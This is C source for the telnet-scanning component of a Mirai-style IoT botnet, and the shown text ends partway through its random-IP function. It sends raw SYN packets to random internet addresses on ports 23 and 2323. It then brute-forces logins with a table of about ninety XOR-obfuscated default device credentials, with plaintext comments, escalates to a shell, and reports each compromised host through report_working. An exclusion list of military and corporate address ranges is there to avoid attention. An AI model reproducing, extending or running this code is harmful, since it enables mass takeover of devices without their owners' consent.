#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#include "headers/includes.h"
#include "headers/scanner.h"
#include "headers/table.h"
#include "headers/rand.h"
#include "headers/util.h"
#include "headers/checksum.h"
#include "headers/resolv.h"

int scanner_pid, rsck, rsck_out, auth_table_len = 0;
char scanner_rawpkt[sizeof (struct iphdr) + sizeof (struct tcphdr)] = {0};
struct scanner_auth *auth_table = NULL;
struct scanner_connection *conn_table;
uint16_t auth_table_max_weight = 0;
uint32_t fake_time = 0;

int recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if (ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if (((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void scanner_init(void)
{
    int i;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    scanner_pid = fork();
    if (scanner_pid > 0 || scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    fake_time = time(NULL);
    conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
    for (i = 0; i < SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = SC_CLOSED;
        conn_table[i].fd = -1;
    }

    // Set up raw socket scanning and payload
    if ((rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
#ifdef DEBUG
        printf("[telnetscanner] failed to initialize raw socket, cannot scan\n");
#endif
        exit(0);
    }
    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));
    i = 1;
    if (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof (i)) != 0)
    {
#ifdef DEBUG
        printf("[telnetscanner] failed to set IP_HDRINCL, cannot scan\n");
#endif
        close(rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xffff;
    }
    while (ntohs(source_port) < 1024);

    iph = (struct iphdr *)scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // Set up IPv4 header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof (struct iphdr) + sizeof (struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;

    // Set up TCP header
    tcph->dest = htons(23);
    tcph->source = source_port;
    tcph->doff = 5;
    tcph->window = rand_next() & 0xffff;
    tcph->syn = TRUE;

    // Set up passwords
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59", 9); // admin admin
    add_auth_entry("\x45\x58\x58\x43", "\x56\x53\x5A\x5E\x59", 7); // root admin
    add_auth_entry("\x42\x55\x59\x43", "\x42\x55\x59\x43", 4); // ubnt ubnt
    add_auth_entry("\x44\x52\x45\x41\x5E\x54\x52", "\x5E\x47\x53\x58\x59\x50\x5B\x52", 6); // service ipdongle
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x5B\x7D\x40\x47\x55\x58\x01", 9); // default lJwpbo6
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x64\x05\x51\x70\x46\x79\x71\x44", 9); // default S2fGqNFs
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x78\x4F\x5F\x5B\x40\x64\x70\x0F", 9); // default OxhlwSG8
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x53\x52\x51\x56\x42\x5B\x43", 5); // default default
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x47\x56\x44\x44\x40\x58\x45\x53", 5); // admin password
    add_auth_entry("\x45\x58\x58\x43", "\x02\x42\x47", 1); // root 5up
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x44\x42\x59\x06\x06\x0F\x0F", 1); // root zsun1188
    add_auth_entry("\x45\x58\x58\x43", "\x5F\x5E\x04\x02\x06\x0F", 1); // root hi3518
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5B\x4F\x4F\x19", 3); // root zlxx.
    add_auth_entry("\x45\x58\x58\x43", "\x41\x5E\x4D\x4F\x41", 3); // root vizxv
    add_auth_entry("\x45\x58\x58\x43", "\x6D\x43\x52\x02\x05\x06", 5); // root Zte521
    add_auth_entry("\x45\x58\x58\x43", "\x56\x59\x5C\x58", 4); // root anko
    add_auth_entry("\x45\x58\x58\x43", "\x5C\x5B\x41\x06\x05\x04", 4); // root klv123
    add_auth_entry("\x45\x58\x58\x43", "\x5E\x41\x53\x52\x41", 4); // root ivdev
    add_auth_entry("\x45\x58\x58\x43", "\x5D\x41\x55\x4D\x53", 4); // root jvbzd
    add_auth_entry("\x45\x58\x58\x43", "\x54\x56\x43\x06\x07\x05\x0E", 4); // root cat1029
    add_auth_entry("\x41\x44\x43\x56\x45\x54\x56\x5A\x05\x07\x06\x02", "\x05\x07\x06\x02\x07\x01\x07\x05", 6); // vstarcam2015 20150602
    add_auth_entry("\x44\x42\x47\x47\x58\x45\x43", "\x44\x42\x47\x47\x58\x45\x43", 1); // support support
    add_auth_entry("\x45\x58\x58\x43", "\x05\x07\x07\x0F\x07\x0F\x05\x01", 7); // root 20080826
    add_auth_entry("\x45\x58\x58\x43", "\x44\x41\x50\x58\x53\x5E\x52", 6); // root svgodie
    add_auth_entry("\x42\x44\x52\x45", "\x42\x44\x52\x45", 1); // user user
    add_auth_entry("\x42\x44\x52\x45", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // user password
    add_auth_entry("\x50\x42\x52\x44\x43", "\x50\x42\x52\x44\x43", 6); // guest guest
    add_auth_entry("\x50\x42\x52\x44\x43", "\x06\x05\x04\x03\x02", 6); // guest 12345
    add_auth_entry("\x50\x42\x52\x44\x43", "\x47\x56\x44\x44\x40\x58\x45\x53", 1); // guest password
    add_auth_entry("\x45\x58\x58\x43", "\x45\x58\x58\x43", 6); // root root
    add_auth_entry("\x45\x58\x58\x43", "\x06\x05\x04\x03\x02\x01", 4); // root 123456
    add_auth_entry("\x45\x58\x58\x43", "\x0F\x0F\x0F\x0F\x0F\x0F\x0F\x0F", 2); // root 88888888
    add_auth_entry("\x45\x58\x58\x43", "\x47\x56\x44\x44\x40\x58\x45\x53", 5); // root password
    add_auth_entry("\x45\x58\x58\x43", "\x47\x56\x44\x44", 2); // root pass
    add_auth_entry("\x45\x58\x58\x43", "\x56\x55\x54\x06\x05\x04", 2); // root abc123
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x05\x04\x03", 4); // admin 1234
    add_auth_entry("\x53\x56\x52\x5A\x58\x59", "\x53\x56\x52\x5A\x58\x59", 3); // daemon daemon
    add_auth_entry("\x56\x53\x5A", "", 6); // adm
    add_auth_entry("\x55\x5E\x59", "", 6); // bin
    add_auth_entry("\x53\x56\x52\x5A\x58\x59", "", 3); // daemon
    add_auth_entry("\x45\x58\x58\x43", "", 6); // root
    add_auth_entry("\x56\x53\x5A\x5E\x59", "", 6); // admin
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "", 3); // default
    add_auth_entry("", "\x44\x5A\x54\x56\x53\x5A\x5E\x59", 4); // smcadmin
    add_auth_entry("\x50\x42\x52\x44\x43", "", 6); // guest
    add_auth_entry("\x50\x42\x52\x44\x43", "\x06\x06\x06\x06", 5); // guest 1111 
    add_auth_entry("\x45\x58\x58\x43", "\x06\x06\x06\x06", 5); // root 1111
    add_auth_entry("\x45\x58\x58\x43", "\x06\x05\x04\x03\x02\x01\x00\x0F", 3); // root 12345678
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x06\x06\x06\x06", 5); // admin 1111
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x47\x56\x44\x44", 4); // admin pass
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x45\x58\x58\x43", 3); // admin root
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x56\x43\x06\x07\x05\x0E", 4); // admin cat1029
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5F\x58\x03\x42\x5C\x42\x01\x56\x43", 1); // admin ho4uku6at
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x53\x41\x45\x05\x02\x0F\x07\x05\x05\x05", 1); // admin dvr2580222
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5A\x52\x5E\x59\x44\x5A", 1); // admin meinsm
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59\x56\x53\x5A\x5E\x59", 2); // admin adminadmin
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x43\x45\x42\x52", 1); // admin true
    add_auth_entry("\x45\x58\x58\x43", "\x5E\x47\x54\x56\x5A\x68\x45\x43\x02\x04\x02\x07", 5); // root ipcam_rt5350
    add_auth_entry("\x45\x58\x58\x43", "\x4F\x5A\x5F\x53\x5E\x47\x54", 1); // root xmhdipc
    add_auth_entry("\x45\x58\x58\x43", "\x53\x52\x51\x56\x42\x5B\x43", 1); // root default
    add_auth_entry("\x45\x58\x58\x43", "\x5D\x42\x56\x59\x43\x52\x54\x5F", 1); // root juantech
    add_auth_entry("\x45\x58\x58\x43", "\x02\x03\x04\x05\x06", 1); // root 54321
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x56\x53\x5A\x5E\x59\x06\x05\x04\x03", 1); // admin admin1234
    add_auth_entry("\x53\x52\x51\x56\x42\x5B\x43", "\x56\x59\x43\x44\x5B\x46", 3); // default antslq
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 5); // admin changeme
    add_auth_entry("\x45\x58\x58\x43", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 5); // root changeme
    add_auth_entry("\x42\x44\x52\x45", "\x54\x5F\x56\x59\x50\x52\x5A\x52", 3); // user changeme
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x66\x40\x52\x44\x43\x7A\x07\x53\x52\x5A", 2); // admin QwestM0dem
    add_auth_entry("\x45\x58\x58\x43", "\x56\x5F\x52\x43\x4D\x5E\x47\x0F", 1); // root ahetzip8
    add_auth_entry("\x45\x58\x58\x43", "\x53\x52\x51\x56\x42\x5B\x43", 3); // root default
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x53\x52\x51\x56\x42\x5B\x43", 3); // admin default
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5A\x5E\x54\x45\x58\x55\x42\x44\x5E\x59\x52\x44\x44", 1); // admin microbusiness
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x44\x5A\x56\x5B\x5B\x55\x42\x44\x5E\x59\x52\x44\x44", 1); // admin smallbusiness
    add_auth_entry("\x45\x58\x58\x43", "\x5E\x73\x5E\x45\x52\x54\x43", 1); // root iDirect
    add_auth_entry("\x45\x58\x58\x43", "\x56\x44\x54\x52\x59\x53", 1); // root ascend
    add_auth_entry("\x45\x58\x58\x43", "\x55\x5B\x52\x59\x53\x52\x45", 1); // root blender
    add_auth_entry("\x45\x58\x58\x43", "\x7B\x6D\x72\x04\x05\x01\x55\x42\x44\x5E\x59\x52\x44\x44", 1); // root LZE326business
    add_auth_entry("\x40\x40\x40\x05", "\x0E\x04\x06\x06", 4); // www2 9311
    add_auth_entry("\x40\x40\x40", "\x0E\x04\x06\x06", 4); // www 9311
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x44\x5A\x54\x56\x53\x5A\x5E\x59", 4); // admin smcadmin
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x54\x58\x59\x52\x4F\x56\x59\x43", 2); // admin conexant
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x05\x01\x07\x06\x5F\x4F", 2); // admin 2601hx
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x52\x4F\x43\x52\x59\x53\x59\x52\x43", 2); // admin extendnet
    add_auth_entry("\x45\x58\x58\x43", "\x5E\x59\x51\x5B\x52\x54\x43\x5E\x58\x59", 2); // root inflection
    add_auth_entry("\x45\x58\x58\x43", "\x43\x07\x43\x56\x5B\x54\x07\x59\x43\x45\x07\x5B\x03\x16", 1); // root t0talc0ntr0l4!
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x5E\x45\x58\x59\x47\x58\x45\x43", 1); // admin ironport
    add_auth_entry("\x45\x58\x58\x43", "\x06\x07\x07\x06\x54\x5F\x5E\x59", 1); // root 1001chim
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x4D\x5F\x58\x59\x50\x4F\x5E\x59\x50", 1); // admin zhongxing
    add_auth_entry("\x45\x58\x58\x43", "\x4D\x5F\x58\x59\x50\x4F\x5E\x59\x50", 1); // root zhongxing
    add_auth_entry("\x45\x58\x58\x43", "\x65\x78\x78\x63\x02\x07\x07", 1); // root ROOT500
    add_auth_entry("\x56\x53\x5A\x5E\x59", "\x59\x74\x40\x7A\x59\x7D\x61\x70\x56\x50", 1); // admin nCwMnJVGag

#ifdef DEBUG
    printf("[telnetscanner] scanner process initialized. scanning started\n");
#endif

    // Main logic loop
    // Main logic loop
    while (TRUE)
    {
        fd_set fdset_rd, fdset_wr;
        struct scanner_connection *conn;
        struct timeval tim;
        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;

        // Spew out SYN to try and get a response
        if (fake_time != last_spew)
        {
            last_spew = fake_time;

            for (i = 0; i < SCANNER_RAW_PPS; i++)
            {
                struct sockaddr_in paddr = {0};
                struct iphdr *iph = (struct iphdr *)scanner_rawpkt;
                struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

                iph->id = rand_next();
                iph->saddr = LOCAL_ADDR;
                iph->daddr = get_random_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

                if (i % 10 == 0)
                {
                    tcph->dest = htons(2323);
                }
                else
                {
                    tcph->dest = htons(23);
                }
                tcph->seq = iph->daddr;
                tcph->check = 0;
                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr)), sizeof (struct tcphdr));

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
            }
        }

        // Read packets from raw socket to get SYN+ACKs
        last_avail_conn = 0;
        while (TRUE)
        {
            int n;
            char dgram[1514];
            struct iphdr *iph = (struct iphdr *)dgram;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
            struct scanner_connection *conn;

            errno = 0;
            n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
            if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                break;

            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
                continue;
            if (iph->daddr != LOCAL_ADDR)
                continue;
            if (iph->protocol != IPPROTO_TCP)
                continue;
            if (tcph->source != htons(23) && tcph->source != htons(2323))
                continue;
            if (tcph->dest != source_port)
                continue;
            if (!tcph->syn)
                continue;
            if (!tcph->ack)
                continue;
            if (tcph->rst)
                continue;
            if (tcph->fin)
                continue;
            if (htonl(ntohl(tcph->ack_seq) - 1) != iph->saddr)
                continue;

            conn = NULL;
            for (n = last_avail_conn; n < SCANNER_MAX_CONNS; n++)
            {
                if (conn_table[n].state == SC_CLOSED)
                {
                    conn = &conn_table[n];
                    last_avail_conn = n;
                    break;
                }
            }

            // If there were no slots, then no point reading any more
            if (conn == NULL)
                break;

            conn->dst_addr = iph->saddr;
            conn->dst_port = tcph->source;
            setup_connection(conn);
#ifdef DEBUG
            printf("[telnetscanner] FD%d Attempting to brute found IP %d.%d.%d.%d\n", conn->fd, iph->saddr & 0xff, (iph->saddr >> 8) & 0xff, (iph->saddr >> 16) & 0xff, (iph->saddr >> 24) & 0xff);
#endif
        }

        // Load file descriptors into fdsets
        FD_ZERO(&fdset_rd);
        FD_ZERO(&fdset_wr);
        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            int timeout;

            conn = &conn_table[i];
            timeout = (conn->state > SC_CONNECTING ? 30 : 5);

            if (conn->state != SC_CLOSED && (fake_time - conn->last_recv) > timeout)
            {
#ifdef DEBUG
                printf("[telnetscanner] FD%d timed out (state = %d)\n", conn->fd, conn->state);
#endif
                close(conn->fd);
                conn->fd = -1;

                // Retry
                if (conn->state > SC_HANDLE_IACS) // If we were at least able to connect, try again
                {
                    if (++(conn->tries) == 40)
                    {
                        conn->tries = 0;
                        conn->state = SC_CLOSED;
                    }
                    else
                    {
                        setup_connection(conn);
#ifdef DEBUG
                        printf("[telnetscanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                    }
                }
                else
                {
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                }
                continue;
            }

            if (conn->state == SC_CONNECTING)
            {
                FD_SET(conn->fd, &fdset_wr);
                if (conn->fd > mfd_wr)
                    mfd_wr = conn->fd;
            }
            else if (conn->state != SC_CLOSED)
            {
                FD_SET(conn->fd, &fdset_rd);
                if (conn->fd > mfd_rd)
                    mfd_rd = conn->fd;
            }
        }

        tim.tv_usec = 0;
        tim.tv_sec = 1;
        nfds = select(1 + (mfd_wr > mfd_rd ? mfd_wr : mfd_rd), &fdset_rd, &fdset_wr, NULL, &tim);
        fake_time = time(NULL);

        for (i = 0; i < SCANNER_MAX_CONNS; i++)
        {
            conn = &conn_table[i];

            if (conn->fd == -1)
                continue;

            if (FD_ISSET(conn->fd, &fdset_wr))
            {
                int err = 0, ret = 0;
                socklen_t err_len = sizeof (err);

                ret = getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if (err == 0 && ret == 0)
                {
                    conn->state = SC_HANDLE_IACS;
                    conn->auth = random_auth_entry();
                    conn->rdbuf_pos = 0;
#ifdef DEBUG
                    printf("[telnetscanner] FD%d connected. Trying %s:%s\n", conn->fd, conn->auth->username, conn->auth->password);
#endif
                }
                else
                {
#ifdef DEBUG
                    printf("[telnetscanner] FD%d error while connecting = %d\n", conn->fd, err);
#endif
                    close(conn->fd);
                    conn->fd = -1;
                    conn->tries = 0;
                    conn->state = SC_CLOSED;
                    continue;
                }
            }

            if (FD_ISSET(conn->fd, &fdset_rd))
            {
                while (TRUE)
                {
                    int ret;

                    if (conn->state == SC_CLOSED)
                        break;

                    if (conn->rdbuf_pos == SCANNER_RDBUF_SIZE)
                    {
                        memmove(conn->rdbuf, conn->rdbuf + SCANNER_HACK_DRAIN, SCANNER_RDBUF_SIZE - SCANNER_HACK_DRAIN);
                        conn->rdbuf_pos -= SCANNER_HACK_DRAIN;
                    }
                    errno = 0;
                    ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos, SCANNER_RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
                    if (ret == 0)
                    {
#ifdef DEBUG
                        printf("[telnetscanner] FD%d connection gracefully closed\n", conn->fd);
#endif
                        errno = ECONNRESET;
                        ret = -1; // Fall through to closing connection below
                    }
                    if (ret == -1)
                    {
                        if (errno != EAGAIN && errno != EWOULDBLOCK)
                        {
#ifdef DEBUG
                            printf("[telnetscanner] FD%d lost connection\n", conn->fd);
#endif
                            close(conn->fd);
                            conn->fd = -1;

                            // Retry
                            if (++(conn->tries) >= 40)

                            {
                                conn->tries = 0;
                                conn->state = SC_CLOSED;
                            }
                            else
                            {
                                setup_connection(conn);
#ifdef DEBUG
                                printf("[telnetscanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                            }
                        }
                        break;
                    }
                    conn->rdbuf_pos += ret;
                    conn->last_recv = fake_time;

                    while (TRUE)
                    {
                        int consumed = 0;

                        switch (conn->state)
                        {
                        case SC_HANDLE_IACS:
                            if ((consumed = consume_iacs(conn)) > 0)
                            {
                                conn->state = SC_WAITING_USERNAME;
#ifdef DEBUG
                                printf("[telnetscanner] FD%d finished telnet negotiation\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_USERNAME:
                            if ((consumed = consume_user_prompt(conn)) > 0)
                            {
                                send(conn->fd, conn->auth->username, conn->auth->username_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                conn->state = SC_WAITING_PASSWORD;
#ifdef DEBUG
                                printf("[telnetscanner] FD%d received username prompt\n", conn->fd);
#endif
                            }
                            break;
                        case SC_WAITING_PASSWORD:
                            if ((consumed = consume_pass_prompt(conn)) > 0)
                            {
#ifdef DEBUG
                                printf("[telnetscanner] FD%d received password prompt\n", conn->fd);
#endif

                                // Send password
                                send(conn->fd, conn->auth->password, conn->auth->password_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);

                                conn->state = SC_WAITING_PASSWD_RESP;
                            }
                            break;
                        case SC_WAITING_PASSWD_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[telnetscanner] FD%d received shell prompt\n", conn->fd);
#endif

                                // Send enable / system / shell / sh to session to drop into shell if needed
                                table_unlock_val(TABLE_SCAN_ENABLE);
                                tmp_str = table_retrieve_val(TABLE_SCAN_ENABLE, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_ENABLE);
                                conn->state = SC_WAITING_ENABLE_RESP;
                            }
                            break;
                        case SC_WAITING_ENABLE_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[telnetscanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SYSTEM);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SYSTEM, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SYSTEM);

                                conn->state = SC_WAITING_SYSTEM_RESP;
                            }
                            break;
            case SC_WAITING_SYSTEM_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[telnetscanner] FD%d received sh prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SHELL);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SHELL, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SHELL);

                                conn->state = SC_WAITING_SHELL_RESP;
                            }
                            break;
                        case SC_WAITING_SHELL_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[telnetscanner] FD%d received enable prompt\n", conn->fd);
#endif

                                table_unlock_val(TABLE_SCAN_SH);
                                tmp_str = table_retrieve_val(TABLE_SCAN_SH, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_SH);

                                conn->state = SC_WAITING_SH_RESP;
                            }
                            break;
                        case SC_WAITING_SH_RESP:
                            if ((consumed = consume_any_prompt(conn)) > 0)
                            {
                                char *tmp_str;
                                int tmp_len;

#ifdef DEBUG
                                printf("[telnetscanner] FD%d received sh prompt\n", conn->fd);
#endif

                                // Send query string
                                table_unlock_val(TABLE_SCAN_QUERY);
                                tmp_str = table_retrieve_val(TABLE_SCAN_QUERY, &tmp_len);
                                send(conn->fd, tmp_str, tmp_len, MSG_NOSIGNAL);
                                send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                                table_lock_val(TABLE_SCAN_QUERY);

                                conn->state = SC_WAITING_TOKEN_RESP;
                            }
                            break;
                        case SC_WAITING_TOKEN_RESP:
                            consumed = consume_resp_prompt(conn);
                            if (consumed == -1)
                            {
#ifdef DEBUG
                                printf("[telnetscanner] FD%d invalid username/password combo\n", conn->fd);
#endif
                                close(conn->fd);
                                conn->fd = -1;

                                // Retry
                                if (++(conn->tries) >= 40)
                                {
                                    conn->tries = 0;
                                    conn->state = SC_CLOSED;
                                }
                                else
                                {
                                    setup_connection(conn);
#ifdef DEBUG
                                    printf("[telnetscanner] FD%d retrying with different auth combo!\n", conn->fd);
#endif
                                }
                            }
                            else if (consumed > 0)
                            {
                                char *tmp_str;
                                int tmp_len;
#ifdef DEBUG
                                printf("[telnetscanner] FD%d Found verified working telnet\n", conn->fd);
#endif
                                report_working(conn->dst_addr, conn->dst_port, conn->auth);
                                close(conn->fd);
                                conn->fd = -1;
                                conn->state = SC_CLOSED;
                            }
                            break;
                        default:
                            consumed = 0;
                            break;
                        }

                        // If no data was consumed, move on
                        if (consumed == 0)
                            break;
                        else
                        {
                            if (consumed > conn->rdbuf_pos)
                                consumed = conn->rdbuf_pos;

                            conn->rdbuf_pos -= consumed;
                            memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                        }
                    }
                }
            }
        }
    }
}

void scanner_kill(void)
{
    kill(scanner_pid, 9);
}

static void setup_connection(struct scanner_connection *conn)
{
    struct sockaddr_in addr = {0};

    if (conn->fd != -1)
        close(conn->fd);
    if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
#ifdef DEBUG
        printf("[telnetscanner] failed to call socket()\n");
#endif
        return;
    }

    conn->rdbuf_pos = 0;
    util_zero(conn->rdbuf, sizeof(conn->rdbuf));

    fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = conn->dst_port;

    conn->last_recv = fake_time;
    conn->state = SC_CONNECTING;
    connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
}

static ipv4_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;

    do
    {
        tmp = rand_next();

        o1 = tmp & 0xff;
        o2 = (tmp >> 8) & 0xff;
        o3 = (tmp >> 16) & 0xff;
        o4 = (tmp >> 24) & 0xff;
    }
    while (o1 == 127 ||                                        //Loopback
          (o1 == 0) ||                                         //Invalid address space
          (o1 == 3) ||                                         //General Electric Company
          (o1 == 15 || o1 == 16) ||                            //Hewlett-Packard Company
          (o1 == 56) ||                                        //US Postal Service
          (o1 == 10) ||                                        //Internal network
          (o1 == 25) ||                                        //Some more
          (o1 == 49) ||                                        //Some more
          (o1 == 50) ||                                        //Some more
          (o1 == 137) ||                                       //Some more
          (o1 == 6) ||                                         //Department of Defense
          (o1 == 7) ||                                         //Department of Defense
          (o1 == 11) ||                                        //Department of Defense
          (o1 == 21) ||                                        //Department of Defense
          (o1 == 22) ||                                        //Department of Defense
          (o1 == 26) ||                                        //Department of Defense
          (o1 == 28) ||                                        //Department of Defense
          (o1 == 29) ||                                        //Department of Defense
          (o1 == 30) ||                                        //Department of Defense
          (o1 == 33) ||                                        //Department of Defense
          (o1 == 55) ||                                        //Department of Defense
          (o1 == 214) ||                                       //Department of Defense
          (o1 == 215) ||                                       //Department of Defense
          (o1 == 192 && o2 == 168) ||                          //Internal network
          (o1 == 172 && o2 >= 16 && o2 < 32) ||                //Internal network
          (o1 == 100 && o2 >= 64 && o2 < 127) ||               //IANA NAT reserved
          (o1 == 169 && o2 > 254) ||                           //IANA NAT reserved
          (o1 == 198 && o2 >= 18 && o2 < 20) ||                //IANA Special use
          (o1 == 146 && o2 == 17) ||                           //Some more
          (o1 == 146 && o2 == 80) ||                           //Some more
          (o1 == 146 && o2 == 98) ||                           //Some more
          (o1 == 146 && o2 == 154) ||                          //Some more
          (o1 == 147 && o2 == 159) ||                          //Some more
          (o1 == 148 && o2 == 114) ||                          //Some more
          (o1 == 150 && o2 == 125) ||                          //Some more
          (o1 == 150 && o2 == 133) ||                          //Some more
          (o1 == 150 && o2 == 144) ||                          //Some more
          (o1 == 150 && o2 == 149) ||                          //Some more
          (o1 == 150 && o2 == 157) ||                          //Some more
          (o1 == 150 && o2 == 184) ||                          //Some more
          (o1 == 150 && o2 == 190) ||                          //Some more
          (o1 == 150 && o2 == 196) ||                          //Some more
          (o1 == 152 && o2 == 82) ||                           //Some more
          (o1 == 152 && o2 == 229) ||                          //Some more
          (o1 == 157 && o2 == 202) ||                          //Some more
          (o1 == 157 && o2 == 217) ||                          //Some more
          (o1 == 161 && o2 == 124) ||                          //Some more
          (o1 == 162 && o2 == 32) ||                           //Some more
          (o1 == 155 && o2 == 96) ||                           //Some more
          (o1 == 155 && o2 == 149) ||                          //Some more
          (o1 == 155 && o2 == 155) ||                          //Some more
          (o1 == 155 && o2 == 178) ||                          //Some more
          (o1 == 164 && o2 == 158) ||                          //Some more
          (o1 == 156 && o2 == 9) ||                            //Some more
          (o1 == 167 && o2 == 44) ||                           //Some more
          (o1 == 168 && o2 == 68) ||                           //Some more
          (o1 == 168 && o2 == 85) ||                           //Some more
          (o1 == 168 && o2 == 102) ||                          //Some more
          (o1 == 203 && o2 == 59) ||                           //Some more
          (o1 == 204 && o2 == 34) ||                           //Some more
          (o1 == 207 && o2 == 30) ||                           //Some more
          (o1 == 117 && o2 == 55) ||                           //Some more
          (o1 == 117 && o2 == 56) ||                           //Some more
